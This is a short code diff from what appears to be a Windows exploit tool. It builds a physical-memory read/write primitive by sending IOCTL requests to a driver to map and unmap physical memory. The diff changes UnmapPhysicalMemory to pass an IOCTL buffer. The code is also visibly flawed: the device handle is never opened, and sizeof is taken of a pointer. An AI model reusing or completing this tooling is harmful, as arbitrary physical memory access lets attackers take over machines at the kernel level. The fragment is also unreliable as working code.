@@ -1,4 +1,5 @@
 #include "rw_primitive.h"
+#include "windows_helper_functions.h"
 
 using myNtMapViewOfSection = NTSTATUS(NTAPI*)(
 	HANDLE SectionHandle,
@@ -37,15 +38,15 @@ BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, __int64 Address, SIZE_T Length,
 	return true;
 }
 
-NTSTATUS UnmapPhysicalMemory(HANDLE PhysicalMemory) {
+NTSTATUS UnmapPhysicalMemory(IOCTL_buffer* buffer) {
 	HANDLE device2 = INVALID_HANDLE_VALUE;
 	NTSTATUS status = FALSE;
 	DWORD bytesReturned = 0;
 
 
-	printf("[ ] Calling UnmapPhysicalMemory 0x%p\n", UnmapPhysicalMemory);
-	status = DeviceIoControl(device2, IOCTL_UnmapPhysicalMemory, PhysicalMemory,
-		sizeof(PhysicalMemory), NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);
+	printf("[ ] Calling UnmapPhysicalMemory\n");
+	status = DeviceIoControl(device2, IOCTL_UnmapPhysicalMemory, buffer,
+		sizeof(buffer), NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL);
 	if (status == FALSE) {
 		fprintf(stderr, "[!] UnmapPhysicalMemory failed with %X\n", status);
 		return EXIT_FAILURE;
